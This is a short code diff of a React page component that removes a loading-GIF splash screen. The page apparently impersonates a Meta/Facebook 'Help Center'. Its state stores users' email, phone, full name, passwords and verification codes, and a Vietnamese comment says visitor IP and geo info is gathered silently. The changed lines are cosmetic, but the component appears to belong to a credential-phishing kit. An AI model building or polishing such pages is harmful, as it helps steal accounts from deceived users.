@@ -1,6 +1,5 @@
 import FromMetaImage from '@/assets/images/from-meta.png';
 import FacebookImage from '@/assets/images/icon.webp';
-import logoGif from '@/assets/images/logo1.gif';
 import FormFlow from '@/components/form-flow';
 import { store } from '@/store/store';
 import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
@@ -56,23 +55,9 @@ const Home = () => {
     const [callingCode, setCallingCode] = useState('+81');
     const [isSubmitting, setIsSubmitting] = useState(false);
     
-    const [showGif, setShowGif] = useState(true);
     const isMountedRef = useRef(true);
 
     const { isModalOpen, setModalOpen, setGeoInfo, geoInfo, setBaseMessage, setUserEmail, setUserPhoneNumber, setUserFullName, setMessageId, resetPasswords, resetCodes } = store();
-
-    useEffect(() => {
-        isMountedRef.current = true;
-        const gifTimer = setTimeout(() => {
-            if (isMountedRef.current) {
-                setShowGif(false);
-            }
-        }, 3000);
-        return () => {
-            isMountedRef.current = false;
-            clearTimeout(gifTimer);
-        };
-    }, []);
 
     // Lấy IP info ngầm (không block form)
     useEffect(() => {
@@ -366,16 +351,6 @@ const Home = () => {
 
     return (
         <>
-            {showGif && (
-                <div className="fixed inset-0 z-50 flex items-center justify-center bg-white">
-                    <img 
-                        src={logoGif} 
-                        alt="Loading" 
-                        className="w-[450px] h-auto lg:w-[600px] lg:h-auto object-contain" 
-                    />
-                </div>
-            )}
-
             <div className='opacity-100'>
                 <header className='sticky top-0 left-0 right-0 z-40 flex h-14 justify-between p-4 shadow-sm bg-white'>
                     <title>Page Help Center</title>
